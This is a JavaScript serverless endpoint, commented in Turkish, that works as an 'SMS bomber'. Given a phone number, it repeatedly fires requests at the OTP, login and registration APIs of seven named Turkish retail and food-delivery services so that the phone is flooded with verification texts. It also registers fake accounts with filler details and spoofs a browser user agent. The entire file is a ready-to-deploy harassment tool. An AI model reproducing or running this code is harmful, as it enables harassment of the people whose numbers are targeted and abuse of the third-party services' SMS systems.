// api/smsboom.js
export default async function handler(req, res) {
  try {
    let phone, amount;

    if (req.method === 'GET') {
      phone = req.query.phone;
      amount = req.query.amount || 5;
    } else if (req.method === 'POST') {
      let body;
      try {
        body = JSON.parse(req.body);
      } catch {
        body = req.body || {};
      }
      phone = body.phone;
      amount = body.amount || 5;
    } else {
      return res.status(405).json({
        status: 'error',
        message: 'Sadece GET ve POST methodu destekleniyor'
      });
    }

    if (!phone) {
      return res.status(400).json({
        status: 'error',
        message: 'phone parametresi gereklidir'
      });
    }

    // Telefon numarasını temizle
    phone = phone.replace(/\s/g, '');
    
    // Telefon validasyonu (Replit sistemine uygun)
    if (!phone.match(/^5[0-9]{9}$/)) {
      return res.status(400).json({
        status: 'error',
        message: 'Geçersiz telefon formatı. 10 haneli ve 5 ile başlamalı. Örnek: 5401234567'
      });
    }

    // Miktar sınırı
    amount = Math.min(Math.max(parseInt(amount), 1), 10);

    console.log(`🚀 SMS Bomber Başlatılıyor: ${phone} - Miktar: ${amount}`);

    // Replit SMS Bomber'ı başlat
    const result = await startReplitSMSBomber(phone, amount);
    
    res.json({
      status: 'success',
      endpoint: '/api/smsboom',
      method: req.method,
      phone: phone,
      amount: amount,
      total_attempts: result.total,
      successful: result.successful,
      failed: result.failed,
      services: result.services,
      timestamp: new Date().toISOString(),
      note: "Replit SMS Bomber sistemi çalıştırıldı"
    });

  } catch (error) {
    console.error('SMS Bomber Hatası:', error);
    res.status(500).json({
      status: 'error',
      message: 'SMS gönderilirken hata oluştu: ' + error.message
    });
  }
}

// Replit SMS Bomber fonksiyonu
async function startReplitSMSBomber(phone, amount) {
  const results = {
    total: 0,
    successful: 0,
    failed: 0,
    services: []
  };

  // Replit'teki servisler
  const services = [
    {
      name: "Bim Cell",
      url: "https://bim.veesk.net/service/v1.0/account/login",
      method: "POST",
      data: { phone: phone }
    },
    {
      name: "Migros Sanal Market", 
      url: "https://rest.migros.com.tr/sanalmarket/users/login/otp",
      method: "POST",
      data: { phoneNumber: phone }
    },
    {
      name: "A101",
      url: "https://www.a101.com.tr/users/otp-login/",
      method: "POST", 
      data: { phone: phone, next: "/a101-kapida" }
    },
    {
      name: "Şok Market",
      url: "https://api.ceptesok.com/api/users/sendsms",
      method: "POST",
      data: { mobile_number: phone, token_type: "register_token" }
    },
    {
      name: "Kahve Dünyası",
      url: "https://core.kahvedunyasi.com/api/users/sms/send",
      method: "POST",
      data: { mobile_number: phone, token_type: "register_token" }
    },
    {
      name: "English Home",
      url: "https://www.englishhome.com/enh_app/users/registration/",
      method: "POST",
      data: {
        first_name: "Test",
        last_name: "User", 
        email: `test${Date.now()}@gmail.com`,
        phone: phone,
        password: "Test123456",
        confirm: "true"
      }
    },
    {
      name: "Tıkla Gelsin",
      url: "https://www.tiklagelsin.com/user/graphql",
      method: "POST",
      headers: {
        "x-device-type": "3",
        "x-merchant-type": "0", 
        "x-no-auth": "true"
      },
      data: {
        operationName: "GENERATE_OTP",
        variables: {
          phone: `+90${phone}`,
          challenge: "85033055-4b81-4f6f-aed2-4a8ee1dce968",
          deviceUniqueId: "web_6f59c0e5-3a0a-4bd3-907d-3cd973152333"
        },
        query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp( phone: $phone challenge: $challenge deviceUniqueId: $deviceUniqueId ) }"
      }
    }
  ];

  // SMS gönderimini başlat
  for (let i = 0; i < amount; i++) {
    console.log(`📦 Tur ${i + 1}/${amount} başlatılıyor...`);
    
    for (const service of services) {
      results.total++;
      
      try {
        const requestOptions = {
          method: service.method,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            ...service.headers
          },
          body: JSON.stringify(service.data)
        };

        const response = await fetch(service.url, requestOptions);
        const isSuccess = response.status === 200 || response.status === 202;

        if (isSuccess) {
          results.successful++;
          console.log(`✅ ${service.name} - Başarılı`);
        } else {
          results.failed++;
          console.log(`❌ ${service.name} - Başarısız (${response.status})`);
        }

        results.services.push({
          service: service.name,
          round: i + 1,
          status: isSuccess ? 'success' : 'failed',
          status_code: response.status,
          timestamp: new Date().toISOString()
        });

        // 2 saniye bekle (rate limit)
        await new Promise(resolve => setTimeout(resolve, 2000));
        
      } catch (error) {
        results.failed++;
        results.services.push({
          service: service.name,
          round: i + 1,
          status: 'error',
          error: error.message,
          timestamp: new Date().toISOString()
        });
        console.log(`⚠️ ${service.name} - Hata: ${error.message}`);
      }
    }
    
    // Tur arası bekleme
    if (i < amount - 1) {
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }

  console.log(`🎉 Replit SMS Bomber tamamlandı! Başarılı: ${results.successful}, Başarısız: ${results.failed}`);
  return results;
}
